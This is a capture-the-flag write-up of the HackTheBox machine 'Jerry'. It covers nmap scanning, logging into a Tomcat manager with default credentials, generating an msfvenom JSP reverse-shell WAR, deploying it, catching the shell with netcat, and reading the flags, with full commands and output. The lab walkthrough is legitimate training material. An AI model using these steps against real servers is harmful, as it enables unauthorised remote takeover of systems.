# HackTheBox: Jerry

A Windows-based CTF from HackTheBox.

- Target IP: 10.10.10.95

## Initial 

Attempted to browse to host, but no response.

Confirmed host is alive with ping.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/oopsie$ ping 10.10.10.95
PING 10.10.10.95 (10.10.10.95) 56(84) bytes of data.
64 bytes from 10.10.10.95: icmp_seq=1 ttl=127 time=7.04 ms
64 bytes from 10.10.10.95: icmp_seq=2 ttl=127 time=8.13 ms
64 bytes from 10.10.10.95: icmp_seq=3 ttl=127 time=7.99 ms
^C
--- 10.10.10.95 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2008ms
rtt min/avg/max/mdev = 7.037/7.720/8.130/0.486 ms
```

Makes approach a little narrower. Lets jump directly into scanning.

## Scanning

### Nmap 

Couldn't browse to host. 
Perhaps there're other interesting services.

Initial nmap scan failed, as if host were down.
Ran nmap with `-Pn` flag instead, worked.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/oopsie$ nmap $victimip -A
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 18:14 BST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 4.00 seconds

kali@kali:~/Desktop/repos/ctf/hack-the-box/oopsie$ nmap $victimip -v -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 18:14 BST
Initiating Parallel DNS resolution of 1 host. at 18:14
Completed Parallel DNS resolution of 1 host. at 18:14, 0.01s elapsed
Initiating Connect Scan at 18:14
Scanning 10.10.10.95 [1000 ports]
Discovered open port 8080/tcp on 10.10.10.95
Completed Connect Scan at 18:14, 4.72s elapsed (1000 total ports)
Nmap scan report for 10.10.10.95
Host is up (0.011s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.82 seconds
``` 

After finding a single service, I further scanned to enumerate the service. 
This was also obvious after browsing to the IP.
It's a __tomcat__ service. 

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/oopsie$ nmap -Pn -p- -T5 -sV $victimip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 18:19 BST
Nmap scan report for 10.10.10.95
Host is up (0.0098s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.60 seconds
```

Didn't find anything more unfortunately, so looks like Tomcat is what we're attacking today.

## Attacking tomcat

Fortunately, I've got a little experience attacking tomcat.
In previous CTFs I've come across a few versions. Most require us to access the tomcat  _manager_ modules.

Lets try find the exact version of Tomcat that the system is using, and whether we can get simple access.

### Browse to host

Version is show atop the page.

```
Apache Tomcat/7.0.88
```

### Access manager app

Clicking around, I found the manager application.
As usual, it requests a username and password.
Whichever genius set up this installation is using default credentials.

```
tomcat:s3cret
```

Which allows us to login.

We can access both the status and the html directory.

```
http://10.10.10.95:8080/manager/status
http://10.10.10.95:8080/manager/html
```

We can likely access more but these links are accessible from homepage.

### Find potential attack vector

I searched around for somewhere to upload a payload. 
We can upload WAR files to the server via the /manager/html page.

```shell
http://10.10.10.95:8080/manager/html
```

See the __Deploy__ section. 

### Msfvenom WAR payload

We can generate a payload with `msfvenom`.
To run, we need a Java/JSP payload, in WAR file-format.
Tomcat is java-based, and runs JSP files.

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box/jerry$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4443 -f war -o shell.war
Payload size: 1084 bytes
Final size of war file: 1084 bytes
Saved as: shell.war
```

### Upload payload

Now we have a payload, lets upload(deploy) it. You'll notice after you Browse, select your payload, then Deploy. Another record is attached to application list.

The application will take on the name of the WAR file you deployed.

To access and execute the reverse shell, simply browse to the URL. In the above case, we need to browse to `/shell`, as we uploaded `shell.war`.

But, before we execute the shell we need to start a listener for our reverse shell.

### Get shell

We'll use netcat listening on `4443`.
After starting listener, navigate to the exploit path.
This will give use shell

```shell
kali@kali:~/Desktop/repos/ctf/hack-the-box$ nc -lvp 4443
listening on [any] 4443 ...
10.10.10.95: inverse host lookup failed: Unknown host
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.95] 49194
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

## Getting user & root flag

Now that we have shell we can look around for more info.

This system is pretty poor in terms of security. Tomcat must be running as Administrator, as we're able to navigate directly to the Administrator /Desktop directory and pull the flags. The flag file gives us _both_ the user flag and the root flag!

```shell
C:\apache-tomcat-7.0.88>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\apache-tomcat-7.0.88

06/19/2018  04:07 AM    <DIR>          .
06/19/2018  04:07 AM    <DIR>          ..
06/19/2018  04:06 AM    <DIR>          bin
06/19/2018  06:47 AM    <DIR>          conf
06/19/2018  04:06 AM    <DIR>          lib
05/07/2018  02:16 PM            57,896 LICENSE
10/02/2020  03:54 AM    <DIR>          logs
05/07/2018  02:16 PM             1,275 NOTICE
05/07/2018  02:16 PM             9,600 RELEASE-NOTES
05/07/2018  02:16 PM            17,454 RUNNING.txt
06/19/2018  04:06 AM    <DIR>          temp
10/02/2020  04:22 AM    <DIR>          webapps
06/19/2018  04:34 AM    <DIR>          work
               4 File(s)         86,225 bytes
               9 Dir(s)  27,602,944,000 bytes free

C:\apache-tomcat-7.0.88>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\

06/19/2018  04:07 AM    <DIR>          apache-tomcat-7.0.88
08/22/2013  06:52 PM    <DIR>          PerfLogs
06/19/2018  06:42 PM    <DIR>          Program Files
06/19/2018  06:42 PM    <DIR>          Program Files (x86)
06/18/2018  11:31 PM    <DIR>          Users
06/19/2018  06:54 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  27,602,944,000 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users

06/18/2018  11:31 PM    <DIR>          .
06/18/2018  11:31 PM    <DIR>          ..
06/18/2018  11:31 PM    <DIR>          Administrator
08/22/2013  06:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  27,602,944,000 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator

06/18/2018  11:31 PM    <DIR>          .
06/18/2018  11:31 PM    <DIR>          ..
06/19/2018  06:43 AM    <DIR>          Contacts
06/19/2018  07:09 AM    <DIR>          Desktop
06/19/2018  06:43 AM    <DIR>          Documents
06/19/2018  06:43 AM    <DIR>          Downloads
06/19/2018  06:43 AM    <DIR>          Favorites
06/19/2018  06:43 AM    <DIR>          Links
06/19/2018  06:43 AM    <DIR>          Music
06/19/2018  06:43 AM    <DIR>          Pictures
06/19/2018  06:43 AM    <DIR>          Saved Games
06/19/2018  06:43 AM    <DIR>          Searches
06/19/2018  06:43 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  27,602,944,000 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)  27,602,944,000 bytes free

C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,602,944,000 bytes free

C:\Users\Administrator\Desktop\flags>type *
type *
user.txt
[REDACTED]

root.txt
[REDACTED]
```

And there we have it. Jerry complete.



